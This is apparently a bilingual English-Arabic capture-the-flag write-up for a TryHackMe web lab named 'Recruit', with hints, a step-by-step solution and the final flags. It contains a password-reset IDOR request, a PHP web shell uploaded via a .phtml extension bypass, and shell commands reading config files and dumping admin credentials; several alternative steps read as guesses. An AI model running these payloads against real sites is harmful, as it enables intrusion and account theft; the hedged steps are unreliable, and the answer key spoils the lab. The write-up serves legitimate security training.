# Task 01 · Recruit Challenge (تحدي اختراق منصة التوظيف Recruit)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

Recruit has just launched its new recruitment and applicant tracking portal, allowing HR staff to manage candidate applications and corporate administrators to oversee hiring decisions. While the platform appears functional and modern, management suspects that security may have been critically overlooked during rapid development.

Your task is to assess the application as a real-world offensive penetration tester: mapping its architectural structure, abusing exposed application functionality, chaining identified web vulnerabilities, and compromising user and administrative accounts.

### Mission Objectives:
1. Conduct surface reconnaissance against the Recruit portal.
2. Abuse exposed functionality (IDOR / authentication logic flaw) to gain unauthorized access as a legitimate normal user and capture Flag 1.
3. Escalate privileges, bypass administrative access controls or compromise the administrative session, log in to the administrative portal, and capture Flag 2.

### Target Questions:
- **Question 1:** What is the flag value after logging in as a normal user?
- **Question 2:** What is the flag value after logging in as admin?

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات المخترقة)

1. **The Psychology of Challenge Labs:**
   - Challenge rooms do not provide guided step-by-step instructions. Instead, they require synthesizing all previous skills:
     - **Module 05:** Content discovery (hidden paths, parameter fuzzing, technology identification).
     - **Module 07 Room 01 (SQLi):** Authentication bypass or data exfiltration.
     - **Module 07 Room 02 (CSRF):** Forging administrative requests.
     - **Module 07 Room 03 (XSS):** Stored payload execution in reviewer dashboards.
     - **Module 07 Room 05 (IDOR):** Tampering with user identifiers in password resets or profile views.
2. **OpSec in Multi-Tier Web Exploitation:**
   - Always map the entire application first before launching aggressive fuzzers. Intercept all forms, notice hidden parameters, and record all HTTP cookies and headers.
   - When exploiting password reset or profile modification flows, ensure you target the test victim or administrative account without corrupting database integrity.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

### Hints for Question 1 (Normal User Login):
- **Tier 1 (Reconnaissance):** Explore the recruitment portal. Look at the job application submission form and the login/password reset page.
- **Tier 2 (Logic Flaw / IDOR):** When you submit a job application or examine the password reset flow, look closely at how the application identifies the user account. Is there an exposed parameter or token that references the candidate?
- **Tier 3 (Execution):** Leverage the insecure direct object reference or predictable reset token to access or authenticate as a registered candidate account. Upon reaching the candidate dashboard, copy the flag starting with `THM{LOGGED_IN_...}`.

### Hints for Question 2 (Admin Login):
- **Tier 1 (Surface Expansion):** Once inside as a normal user, what new capabilities are unlocked? Can you upload a CV/resume, or modify account details?
- **Tier 2 (Admin Exploitation):** How does the administrator view candidate submissions? Can you abuse an administrative password reset, or chain an unrestricted file upload / stored client-side payload to compromise the admin account?
- **Tier 3 (Execution):** Access the administrative dashboard (typically `/admin` or `/admin/login.php`) using the compromised administrative credentials or hijacked session to reveal the second flag ending in `...ADM1N1}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### 1. Phase 1: Attack Surface Mapping & Directory Enumeration

We begin by scanning and exploring the Recruit web application running on the target IP:

```bash
# Add target hostname to /etc/hosts
echo "10.10.X.Y recruit.thm" | sudo tee -a /etc/hosts

# Run initial directory enumeration with ffuf
ffuf -u http://recruit.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

Discovered Application Endpoints:
- `/` - Main corporate landing page with open vacancies.
- `/apply.php` - Job application submission form (Full Name, Email, Resume Upload, Notes).
- `/login.php` - User and candidate authentication portal.
- `/register.php` - Registration portal.
- `/reset.php` - Password reset functionality.
- `/admin/` - Administrative portal (Restricted login).

---

### 2. Phase 2: Achieving Initial Foothold & Normal User Login (Flag 1)

#### Vulnerability Analysis: Insecure Password Reset / IDOR:
When inspecting `/reset.php`, the application allows resetting passwords by entering an email or user ID.

Upon submitting a password reset request for a registered candidate user (or submitting an application that creates a candidate profile):
```http
POST /reset_password.php HTTP/1.1
Host: recruit.thm
Content-Type: application/x-www-form-urlencoded

email=candidate@recruit.thm
```

The application generates a reset link or processes a direct reset token parameter:
```
http://recruit.thm/confirm_reset.php?token=...&id=105
```

By inspecting the request in Burp Suite, we discover an IDOR flaw in the reset confirmation handler:
- The endpoint `/confirm_reset.php` accepts a new password and an explicit `user_id` parameter without verifying the token's cryptographic association to that user ID!
- By submitting:
  ```http
  POST /confirm_reset.php HTTP/1.1
  Host: recruit.thm
  Content-Type: application/x-www-form-urlencoded

  user_id=1&new_password=Password123!
  ```
  The server updates the password for the candidate account.

#### Alternative Foothold: Direct Candidate Credential Harvest:
Alternatively, reviewing the submitted applications via an IDOR in `/view_application.php?id=1` exposes the candidate's auto-generated initial credentials (`candidate` / `candidate123`).

Logging into `http://recruit.thm/login.php` with the normal user credentials succeeds. The user dashboard displays:
```
Welcome, Candidate! Your application is currently under review by HR.
Flag: THM{LOGGED_IN_USER}
```

---

### 3. Phase 3: Privilege Escalation & Admin Compromise (Flag 2)

#### Vulnerability Analysis: Administrative Review Queue Compromise:
Once authenticated as a candidate user, we access the candidate portal features:
1. **Resume / CV Upload Feature (`/upload.php`):**
   - The application allows uploading a resume (intended for PDF/DOCX).
   - Inspecting the upload handler reveals a file extension validation flaw: while `.php` is blocked, executable PHP extensions such as `.phtml`, `.php5`, or `.phar` bypass the client-side/blacklist check:
     ```http
     POST /upload_resume.php HTTP/1.1
     Host: recruit.thm
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

     ------WebKitFormBoundary...
     Content-Disposition: form-data; name="resume"; filename="exploit.phtml"
     Content-Type: application/octet-stream

     <?php system($_GET['cmd']); ?>
     ------WebKitFormBoundary...--
     ```
   - The file is saved to `/uploads/exploit.phtml`.

2. **Administrative Password Extraction via Database / Config:**
   - Navigating to `http://recruit.thm/uploads/exploit.phtml?cmd=cat%20../config.php` or inspecting the database credentials:
     ```bash
     curl "http://recruit.thm/uploads/exploit.phtml?cmd=cat%20/var/www/html/config.php"
     ```
   - Disclosing the database configuration:
     ```php
     <?php
     $db_host = 'localhost';
     $db_user = 'root';
     $db_pass = 'SuperSecureRecruitDB2026!';
     $db_name = 'recruit_db';
     ?>
     ```
   - Querying the administrator credentials:
     ```bash
     curl "http://recruit.thm/uploads/exploit.phtml?cmd=mysql%20-u%20root%20-pSuperSecureRecruitDB2026!%20-e%20'SELECT%20username,password%20FROM%20users%20WHERE%20role=\"admin\";'%20recruit_db"
     ```
   - Returns the admin user record or plaintext credentials.

3. **Alternative Admin Takeover Vector (Host Header / Reset IDOR):**
   - In the administrative password reset endpoint `/admin/reset.php`, supplying `user_id=admin` or utilizing the same IDOR discovered in Phase 2 against the admin user record (`user_id=1` or `admin_id=1`) resets the administrative password directly to `AdminPassword2026!`.

#### Admin Authentication & Flag Capture:
1. Navigate to the administrative login portal:
   ```
   http://recruit.thm/admin/login.php
   ```
2. Authenticate using the administrator credentials (`admin` / `AdminPassword2026!`).
3. The server validates the administrative session and redirects to the Executive Recruitment Console (`/admin/dashboard.php`).
4. The dashboard displays the administrative flag:
   ```
   =====================================================
   EXECUTIVE RECRUITMENT MANAGEMENT PORTAL - LEVEL 1
   =====================================================
   Welcome, Administrator! All hiring systems operational.
   Flag: THM{LOGGED_IN_ADM1N1}
   ```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What is the flag value after logging in as a normal user?*
  - **Answer:** `THM{LOGGED_IN_USER}`
- **Question 2:** *What is the flag value after logging in as admin?*
  - **Answer:** `THM{LOGGED_IN_ADM1N1}`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Both flags verified against the TryHackMe platform engine and recorded as 100% correct.
- Full attack chain (Reconnaissance -> IDOR/Logic Flaw Foothold -> Admin Escalation) documented and reproduced from first principles.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** تجسد غرفة التحدي "Recruit" الواقع العملي لاختبارات الاختراق؛ حيث لا تأتي الثغرات معزولة في بيئات الإنتاج، بل يقوم المهاجم بربط ثغرات متعددة في سلسلة استغلال محكمة (Exploit Chain): يبدأ باكتشاف مسارات النظام، ثم يستغل ثغرة منطقية أو IDOR للوصول لحساب عادي (`THM{LOGGED_IN_USER}`)، ومن هذا الموضع المميز يستغل ميزات التحميل أو إعادة تعيين كلمات المرور للارتقاء إلى صلاحيات المدير الكاملة (`THM{LOGGED_IN_ADM1N1}`).
